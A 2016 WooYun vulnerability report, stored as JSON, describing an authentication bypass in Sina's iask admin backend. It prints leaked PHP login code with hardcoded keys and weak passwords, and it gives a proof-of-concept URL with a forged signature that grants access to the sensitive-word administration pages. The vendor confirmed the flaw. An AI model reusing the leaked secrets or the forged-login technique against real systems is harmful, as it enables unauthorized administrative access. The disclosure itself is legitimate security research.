{"id": 84898, "wybug_id": "wooyun-2016-0170890", "wybug_title": "新浪综合管理后台存在高危设计缺陷可获取管理权限（敏感词的添加/删除/修改等操作）", "wybug_corp": "新浪", "wybug_author": "HackBraid", "wybug_date": "2016-01-18 17:03", "wybug_open_date": "2016-02-27 11:49", "wybug_type": "敏感信息泄露", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["敏感信息泄露"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-01-18：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-01-18：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-01-28：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-02-07：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-02-17：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-02-27：\t细节向公众公开  简要描述： RT敏感词库的权限，weibo那次传播**广告是不是也是这个原因呢？ 详细说明：  源：http://admin.iask.sina.com.cn/.svn/entries信息泄漏漏洞（目前已修补）看源码，发现一个地方可以伪造登陆；/api/login.php处源码如下：\n<?phpini_set('session.cookie_domain', \".iask.sina.com.cn\");error_reporting(E_ALL);ini_set('display_errors', 1);define('COOKIE_DOMAIN', '.admin.iask.sina.com.cn');include('/data4/adminManage/conf/adminconf.php');session_start();$appmap = array(\t1000=>'d420915821e92b6559478b446445d172',\t1001=>'d420915821e92b6559478b446445d171',);$appuser = array(\t1000=>array('user'=>'weibo_zhishi', 'pw'=>'123456'),\t1001=>array('user'=>'baby_zhishi', 'pw'=>'123456'),);$appto = array(\t1000=>'http://admin.iask.sina.com.cn/audit/ishare_audit.php?action=indexapp',\t1001=>'http://admin.iask.sina.com.cn/audit/ishare_audit.php?action=indexapp',);$appgroup = array(\t1000=>array(7, 8, 10),\t1001=>array(16),);$appid = isset($_GET['appid']) ? intval($_GET['appid']) : 0;$sign = isset($_GET['sign']) ? $_GET['sign'] : '';$time = isset($_GET['time']) ? intval($_GET['time']) : 0;$ip = isset($_GET['ip']) ? $_GET['ip'] : '';$user = isset($_GET['user']) ? $_GET['user'] : '';//下面的判断可以通过设置好参数来绕过，appid这里使用1000if(!$appid||!$sign||!$time||!$ip||!$user||!isset($appmap[$appid])||!isset($appuser[$appid])) {\texit('1001');}//time()函数，底下的exit注释掉了 - -！if($time<time()-10*60) {\t//exit('1002');}$rip = lip::get_real_ip();//底下的exit注释掉了 - -！if($rip!=$ip) {\t//exit('1003');}error_log($rip.'-'.$ip.\"\\n\", 3, '/tmp/apip.log');//这里可以自己伪造了~~~222333~~~$sign_me = substr(md5($appid.$user.$time.$ip.$appmap[$appid]), 3, 16);if($sign_me!=$sign) {\texit('1004');}$username = $appuser[$appid];global $db_admin;$userDB = new admin_userDB($db_admin);$rs = $userDB->check_password($appuser[$appid]['user'], $appuser[$appid]['pw'],true);//设置cookie字段说明可以登录if(is_array($rs)) {\tset_cookie(\"userid\"      , $rs['uid']);\tset_cookie(\"username\"    , $rs['uname']);\tset_cookie(\"name\"        , 'supe');\tset_cookie(\"gname\"       , $rs['gname']);\tset_cookie(\"gid\"         , $rs['gid']);\tset_cookie(\"menuids_admin\"     , $rs['menuid']);\tif(!$_COOKIE['lastlogintime']) {\t\t$_COOKIE['lastlogintime'] = date('Y-m-d H:i:s');\t\tset_cookie(\"lastlogintime\" , $_COOKIE['lastlogintime']);\t}} else {\texit('1005');}$_SESSION['audit']['app']['username'] = $user;$_SESSION['audit']['app']['group'] = $appgroup[$appid];$result = 1000;if(isset($_GET['location'])&&$_GET['location']==1) {\t$result = \"<script>window.location.href='{$appto[$appid]}'</script>\";}exit(\"$result\");function set_cookie($cname , $cval) {\tsetcookie($cname , $cval , 0 , \"/\" , COOKIE_DOMAIN);}\n   漏洞证明：  证明一下：http://admin.iask.sina.com.cn/api/login.php?appid=1000&sign=13f069bbd9f3ab16&time=1554091094&ip=8.8.8.8&user=weibo_zhishi\n\n看下成功设置了cookie：http://admin.iask.sina.com.cn/api/print.php\n\nhttp://admin.iask.sina.com.cn/filter/set_sensitive_vocabulary.php?type=%C8%AB%B2%BF&level=%C8%AB%B2%BF&own=&word=&Submit=%B2%E9%D5%D2关键词的修改删除操作：\n\n这些是什么关键词呢？应该是敏感词库！还能更新～～222333http://admin.iask.sina.com.cn/filter/control_set_for_ishare_content.php\n\nhttp://admin.iask.sina.com.cn/filter/ishare_title_red.php\n\n   修复方案：  权限控制   版权声明：转载请注明来源 HackBraid@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：8  确认时间：2016-01-18 17:19 厂商回复： 感谢关注新浪安全，安全问题修复中。 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2016-01-18 17:17 |    \t\t坏男孩-A_A \t\t\t( 实习白帽子  |\t\t\t        Rank:37 漏洞数:17        | 膜拜学习中)\t\t \n  隔壁太牛鼻，近来躲躲    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 8, "Ranks": null}